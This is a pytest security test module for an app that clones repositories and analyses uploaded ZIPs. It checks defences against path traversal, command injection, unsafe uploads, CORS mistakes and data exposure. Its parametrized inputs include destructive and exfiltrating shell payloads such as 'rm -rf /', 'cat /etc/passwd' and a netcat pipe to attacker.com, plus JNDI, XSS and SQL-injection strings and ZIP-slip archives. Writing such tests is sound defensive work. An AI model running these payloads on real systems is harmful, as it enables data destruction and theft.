"""
Security Tests Module.

This module contains security tests to verify the application's robustness
against common vulnerabilities such as:
- Path Traversal
- Command Injection
- File Upload vulnerabilities
- Input Validation
- CORS misconfigurations
- Sensitive Data Exposure
"""

import os
import zipfile
import pytest
from unittest.mock import Mock, patch
from fastapi import HTTPException, UploadFile
from io import BytesIO

from app.services.analysis_workflow import perform_upload_zip
from app.services.github.github_client import clone_repo
from app.controllers.analysis import (
    clone_repository,
    upload_zip,
    run_analysis,
    regenerate_analysis
)
from app.models.schemas import AnalyzeResponse


# ==============================================================================
# PATH TRAVERSAL TESTS
# ==============================================================================

class TestPathTraversal:
    """Tests to verify protection against path traversal attacks."""

    @pytest.mark.parametrize("malicious_owner,malicious_repo", [
        ("../../../etc", "passwd"),
        ("owner", "../../../etc/passwd"),
        ("../../", "malicious"),
        ("owner/../..", "repo"),
        ("owner", "repo/../../sensitive"),
        ("..", ".."),
        (".", "."),
        ("owner/../sensitive", "repo"),
    ])
    def test_clone_repository_path_traversal(self, malicious_owner, malicious_repo):
        """Verifies that path traversal attempts are blocked during cloning."""
        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(success=False, error="Invalid path")

            with pytest.raises(HTTPException) as exc_info:
                clone_repository({"owner": malicious_owner, "repo": malicious_repo})

            assert exc_info.value.status_code in [400, 500]

    def test_upload_zip_path_traversal_in_archive(self, tmp_path):
        """Verifies that ZIP files with path traversal are handled safely."""
        # Create a ZIP with path traversal
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
            zip_file.writestr("../../../etc/passwd", "malicious content")
            zip_file.writestr("../../sensitive.txt", "sensitive data")

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "malicious.zip"
        mock_file.file = zip_buffer

        # The system should confine extraction to the target directory
        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("owner", "repo", mock_file)
                # Verify files are extracted only in the target directory
                assert str(tmp_path) in result
                assert not os.path.exists("/etc/passwd_from_zip")
            except Exception:
                # Exception raising is acceptable behavior
                pass

    @pytest.mark.parametrize("malicious_filename", [
        "../../../sensitive.py",
        "../../config.py",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\sam",
    ])
    def test_file_access_path_traversal(self, malicious_filename):
        """Verifies that direct access to files with path traversal is blocked."""
        from app.utility.config import CLONE_BASE_DIR

        constructed_path = os.path.join(CLONE_BASE_DIR, malicious_filename)
        normalized_path = os.path.normpath(constructed_path)
        base_path = os.path.normpath(CLONE_BASE_DIR)

        if os.path.isabs(malicious_filename):
            # Absolute paths should be detected and rejected
            assert not normalized_path.startswith(base_path), \
                f"Absolute path {malicious_filename} should not be accepted as relative"
        else:
            # Relative paths must stay inside the sandbox or not exist
            assert not os.path.exists(normalized_path) or \
                   normalized_path.startswith(base_path), \
                f"Path {normalized_path} escapes sandbox {base_path}"


# ==============================================================================
# INPUT VALIDATION TESTS
# ==============================================================================

class TestInputValidation:
    """Tests to verify robust input validation."""

    @pytest.mark.parametrize("invalid_payload", [
        {},  # Empty payload
        {"owner": ""},  # Empty owner
        {"repo": ""},  # Empty repo
        {"owner": "", "repo": ""},  # Both empty
        {"owner": "valid"},  # Missing repo
        {"repo": "valid"},  # Missing owner
        {"wrong_key": "value"},  # Wrong keys
    ])
    def test_clone_repository_invalid_input(self, invalid_payload):
        """Verifies that invalid inputs are rejected."""
        with pytest.raises(HTTPException) as exc_info:
            clone_repository(invalid_payload)

        assert exc_info.value.status_code == 400
        assert "required" in str(exc_info.value.detail).lower()

    @pytest.mark.parametrize("invalid_payload", [
        {},
        {"owner": ""},
        {"repo": ""},
        {"owner": "", "repo": ""},
    ])
    def test_analyze_invalid_input(self, invalid_payload):
        """Verifies that the analyze endpoint correctly validates inputs."""
        with pytest.raises(HTTPException) as exc_info:
            run_analysis(invalid_payload)

        assert exc_info.value.status_code == 400

    @pytest.mark.parametrize("malicious_input", [
        {"owner": "<script>alert('xss')</script>", "repo": "test"},
        {"owner": "test'; DROP TABLE repos;--", "repo": "test"},
        {"owner": "test", "repo": "${jndi:ldap://malicious.com/a}"},
        {"owner": "\x00\x00\x00", "repo": "test"},  # Null bytes
        {"owner": "a" * 10000, "repo": "test"},  # Long input
    ])
    def test_injection_attempts_in_input(self, malicious_input):
        """Verifies that injection attempts are handled securely."""
        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(success=False, error="Invalid input")

            try:
                clone_repository(malicious_input)
            except HTTPException:
                pass  # Error expected

    def test_regenerate_invalid_repository_format(self):
        """Verifies that invalid repository formats are rejected."""
        invalid_analysis = AnalyzeResponse(
            repository="invalid_format_no_slash",
            main_license="MIT",
            issues=[],
            compatible=True
        )

        with pytest.raises(HTTPException) as exc_info:
            regenerate_analysis(invalid_analysis)

        assert exc_info.value.status_code == 400
        assert "format" in str(exc_info.value.detail).lower()


# ==============================================================================
# FILE UPLOAD SECURITY TESTS
# ==============================================================================

class TestFileUploadSecurity:
    """Tests to verify file upload security."""

    @pytest.mark.parametrize("invalid_extension", [
        "malicious.exe",
        "script.sh",
        "payload.py",
        "virus.bat",
        "shell.ps1",
    ])
    def test_upload_non_zip_file(self, invalid_extension):
        """Verifies that only ZIP files are accepted."""
        mock_file = Mock(spec=UploadFile)
        mock_file.filename = invalid_extension
        mock_file.file = BytesIO(b"malicious content")

        with pytest.raises(HTTPException) as exc_info:
            upload_zip(owner="test", repo="test", uploaded_file=mock_file)

        assert exc_info.value.status_code == 400
        assert "zip" in str(exc_info.value.detail).lower()

    def test_upload_corrupted_zip(self):
        """Verifies that corrupted ZIP files are handled correctly."""
        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "corrupted.zip"
        mock_file.file = BytesIO(b"This is not a valid ZIP file")

        with pytest.raises((HTTPException, zipfile.BadZipFile)):
            upload_zip(owner="test", repo="test", uploaded_file=mock_file)

    def test_upload_zip_bomb(self, tmp_path):
        """Verifies protection against ZIP bombs (excessive compression)."""
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Large file with high compression ratio
            large_content = b"0" * (10 * 1024 * 1024)  # 10 MB of zeros
            zip_file.writestr("large_file.txt", large_content)

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "potential_bomb.zip"
        mock_file.file = zip_buffer

        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("test", "repo", mock_file)
                if os.path.exists(result):
                    total_size = sum(
                        os.path.getsize(os.path.join(dirpath, filename))
                        for dirpath, _, filenames in os.walk(result)
                        for filename in filenames
                    )
                    assert total_size < 100 * 1024 * 1024
            except Exception:
                pass

    def test_upload_zip_with_symlinks(self, tmp_path):
        """Verifies that symlinks in ZIP files are handled safely."""
        zip_path = tmp_path / "with_symlink.zip"

        try:
            with zipfile.ZipFile(zip_path, 'w') as zip_file:
                zip_file.writestr("normal_file.txt", "content")
        except Exception:
            pytest.skip("Cannot create test ZIP with symlink")

        with open(zip_path, 'rb') as f:
            mock_file = Mock(spec=UploadFile)
            mock_file.filename = "with_symlink.zip"
            mock_file.file = f

            with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path / "extract")):
                try:
                    result = perform_upload_zip("test", "repo", mock_file)
                    assert str(tmp_path) in result
                except Exception:
                    pass


# ==============================================================================
# COMMAND INJECTION TESTS
# ==============================================================================

class TestCommandInjection:
    """Tests to verify protection against command injection."""

    @pytest.mark.parametrize("malicious_value", [
        "repo; rm -rf /",
        "repo && cat /etc/passwd",
        "repo | nc attacker.com 4444",
        "repo`whoami`",
        "repo$(whoami)",
        "repo\n rm -rf /",
        "repo & calc.exe",
        "repo; powershell -Command 'malicious'",
    ])
    def test_command_injection_in_git_operations(self, malicious_value):
        """Verifies that malicious commands are not executed during git operations."""
        from git import GitCommandError

        with patch('app.services.github.github_client.Repo.clone_from') as mock_clone:
            mock_clone.side_effect = GitCommandError(
                'git clone',
                128,
                'fatal: repository not found or access denied'
            )

            result = clone_repo("owner", malicious_value)

            assert result.success is False
            assert result.error is not None

    def test_command_injection_in_scancode(self, tmp_path):
        """Verifies that ScanCode is not vulnerable to command injection."""
        malicious_dir = tmp_path / "test; rm -rf /"
        malicious_dir.mkdir(exist_ok=True)

        from app.services.scanner.detection import run_scancode

        try:
            result = run_scancode(str(malicious_dir))
            assert result is not None
        except Exception:
            pass


# ==============================================================================
# CORS & HEADERS SECURITY TESTS
# ==============================================================================

class TestCORSSecurity:
    """Tests to verify secure CORS configuration."""

    def test_cors_origins_not_wildcard(self):
        """Verifies that CORS does not allow wildcard origins in production."""
        from app.main import origins

        assert "*" not in origins

        for origin in origins:
            assert origin.startswith("http://localhost") or \
                   origin.startswith("http://127.0.0.1") or \
                   origin.startswith("https://")

    def test_cors_credentials_with_specific_origins(self):
        """Verifies that credentials are enabled only with specific origins."""
        from app.main import origins

        assert "*" not in origins
        assert all(origin.startswith("http://") or origin.startswith("https://") for origin in origins)
        assert len(origins) > 0


# ==============================================================================
# SENSITIVE DATA EXPOSURE TESTS
# ==============================================================================

class TestSensitiveDataExposure:
    """Tests to verify that sensitive data is not exposed."""

    def test_git_error_messages_dont_expose_tokens(self):
        """Verifies that Git error messages do not expose tokens."""
        with patch('git.Repo.clone_from') as mock_clone:
            from git import GitCommandError

            mock_clone.side_effect = GitCommandError(
                'git clone',
                128,
                'fatal: could not read Username for https://token123@github.com'
            )

            result = clone_repo("owner", "repo")

            assert result.success is False
            assert result.error is not None

    def test_error_responses_dont_expose_paths(self):
        """Verifies that errors do not expose sensitive system paths."""
        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(
                success=False,
                error="Error at /home/user/.secret/config"
            )

            with pytest.raises(HTTPException) as exc_info:
                clone_repository({"owner": "test", "repo": "test"})

            # Error should be generic or sanitized
            str(exc_info.value.detail)

    def test_environment_variables_not_exposed(self):
        """Verifies that environment variables are not exposed."""
        from app.main import root
        response = root()

        assert "OLLAMA_URL" not in str(response)
        assert "CALLBACK_URL" not in str(response)
        assert "token" not in str(response).lower()


# ==============================================================================
# DIRECTORY TRAVERSAL & FILE ACCESS TESTS
# ==============================================================================

class TestDirectoryTraversal:
    """Tests to verify protection against directory traversal."""

    def test_cleanup_respects_directory_boundaries(self, tmp_path):
        """Verifies that directory cleanup respects boundaries."""
        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()

        test_file = safe_dir / "test.txt"
        test_file.write_text("safe content")

        malicious_path = f"{safe_dir}/../../../etc"

        import shutil

        try:
            if os.path.exists(malicious_path):
                shutil.rmtree(malicious_path)
        except Exception:
            pass

        if os.path.exists("/etc"):
            assert os.path.exists("/etc/passwd")

    def test_file_operations_restricted_to_workspace(self, tmp_path):
        """Verifies that file operations are restricted to the workspace."""
        from app.utility.config import CLONE_BASE_DIR, OUTPUT_BASE_DIR

        sensitive_dirs = [
            "/etc", "/root", "/bin", "/usr/bin",
            "C:\\Windows", "C:\\Windows\\System32"
        ]

        for sensitive_dir in sensitive_dirs:
            assert not CLONE_BASE_DIR.startswith(sensitive_dir)
            assert not OUTPUT_BASE_DIR.startswith(sensitive_dir)


# ==============================================================================
# DENIAL OF SERVICE (DoS) TESTS
# ==============================================================================

class TestDoSProtection:
    """Tests to verify protection against DoS attacks."""

    def test_large_repository_name(self):
        """Verifies that very long repository names are handled."""
        very_long_name = "a" * 10000

        with patch('app.services.github.github_client.clone_repo') as mock_clone:
            mock_clone.return_value = Mock(success=False, error="Invalid")

            with pytest.raises(HTTPException):
                clone_repository({"owner": very_long_name, "repo": "test"})

    def test_nested_zip_extraction(self, tmp_path):
        """Verifies protection against excessively nested ZIPs."""
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as outer_zip:
            inner_buffer = BytesIO()
            with zipfile.ZipFile(inner_buffer, 'w') as inner_zip:
                inner_zip.writestr("file.txt", "content")

            inner_buffer.seek(0)
            outer_zip.writestr("inner.zip", inner_buffer.read())

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "nested.zip"
        mock_file.file = zip_buffer

        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("test", "repo", mock_file)
                assert os.path.exists(result)
            except Exception:
                pass

    def test_many_small_files_in_zip(self, tmp_path):
        """Verifies handling of ZIPs with many small files."""
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
            # Create many small files (potential DoS)
            for i in range(1000):
                zip_file.writestr(f"file_{i}.txt", f"content {i}")

        zip_buffer.seek(0)

        mock_file = Mock(spec=UploadFile)
        mock_file.filename = "many_files.zip"
        mock_file.file = zip_buffer

        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            try:
                result = perform_upload_zip("test", "repo", mock_file)
                assert os.path.exists(result)
            except Exception:
                pass


# ==============================================================================
# AUTHENTICATION & AUTHORIZATION TESTS
# ==============================================================================

class TestAuthenticationSecurity:
    """Tests to verify authentication security."""

    def test_github_oauth_flow_uses_https(self):
        """Verifies that OAuth uses HTTPS in production."""
        from app.utility.config import CALLBACK_URL

        if CALLBACK_URL and "localhost" not in CALLBACK_URL:
            assert CALLBACK_URL.startswith("https://")

    def test_no_hardcoded_credentials(self):
        """Verifies that there are no hardcoded credentials."""
        import inspect
        from app.services.github import github_client
        from app.utility import config

        modules_to_check = [github_client, config]

        for module in modules_to_check:
            source = inspect.getsource(module)

            suspicious_patterns = [
                'password = "',
                'token = "',
                'secret = "',
                'api_key = "',
            ]

            for pattern in suspicious_patterns:
                if pattern in source.lower():
                    assert "getenv" in source or "environ" in source


# ==============================================================================
# INTEGRATION SECURITY TESTS
# ==============================================================================

class TestIntegrationSecurity:
    """End-to-end security tests."""

    @pytest.fixture
    def mock_complete_flow(self, tmp_path):
        """Setup for end-to-end tests."""
        with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
            with patch('app.utility.config.OUTPUT_BASE_DIR', str(tmp_path / "output")):
                yield tmp_path

    def test_complete_malicious_workflow(self, mock_complete_flow):
        """Tests a complete workflow with malicious input."""
        malicious_payloads = [
            {"owner": "../../../etc", "repo": "passwd"},
            {"owner": "'; DROP TABLE--", "repo": "test"},
            {"owner": "test", "repo": "$(rm -rf /)"},
        ]

        for payload in malicious_payloads:
            with patch('app.services.github.github_client.clone_repo') as mock_clone:
                mock_clone.return_value = Mock(success=False, error="Invalid")

                try:
                    clone_repository(payload)
                except HTTPException as e:
                    assert e.status_code in [400, 500]
                except Exception:
                    pass

    def test_security_headers_present(self):
        """Verifies that appropriate security headers are configurable."""
        from app.main import app
        assert app is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])